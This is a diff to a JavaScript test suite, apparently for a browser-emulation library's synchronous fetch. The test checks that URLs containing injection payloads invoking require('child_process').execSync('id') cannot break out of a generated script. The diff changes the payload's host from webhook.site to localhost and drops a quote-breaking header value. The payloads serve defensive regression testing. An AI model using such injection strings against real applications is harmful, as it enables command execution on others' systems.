@@ -253,7 +253,7 @@ describe('SyncFetch', () => {
 			browserFrame.url = 'https://localhost:8080/';
 
 			const url =
-				"https://webhook.site/`+require('child_process').execSync('id')+`/'+require('child_process').execSync('id')+'";
+				"https://localhost:8080/`+require('child_process').execSync('id')+`/'+require('child_process').execSync('id')+'";
 			const responseText = 'test';
 
 			mockModule('child_process', {
@@ -267,7 +267,7 @@ describe('SyncFetch', () => {
 					expect(args[1]).toBe(
 						SyncFetchScriptBuilder.getScript({
 							url: new URL(
-								"https://webhook.site/%60+require('child_process').execSync('id')+%60/'+require('child_process').execSync('id')+'"
+								"https://localhost:8080/%60+require('child_process').execSync('id')+%60/'+require('child_process').execSync('id')+'"
 							),
 							method: 'GET',
 							headers: {
@@ -275,8 +275,7 @@ describe('SyncFetch', () => {
 								Connection: 'close',
 								Referer: 'https://localhost:8080/',
 								'User-Agent': window.navigator.userAgent,
-								'Accept-Encoding': 'gzip, deflate, br',
-								test: '" +require() + "'
+								'Accept-Encoding': 'gzip, deflate, br'
 							},
 							body: null
 						})
@@ -285,7 +284,7 @@ describe('SyncFetch', () => {
 					// By using ` for the URL string within the script, we can prevent the script from being injected
 					expect(
 						args[1].includes(
-							`\`https://webhook.site/%60+require('child_process').execSync('id')+%60/'+require('child_process').execSync('id')+'\``
+							`\`https://localhost:8080/%60+require('child_process').execSync('id')+%60/'+require('child_process').execSync('id')+'\``
 						)
 					).toBe(true);
 					expect(options).toEqual({
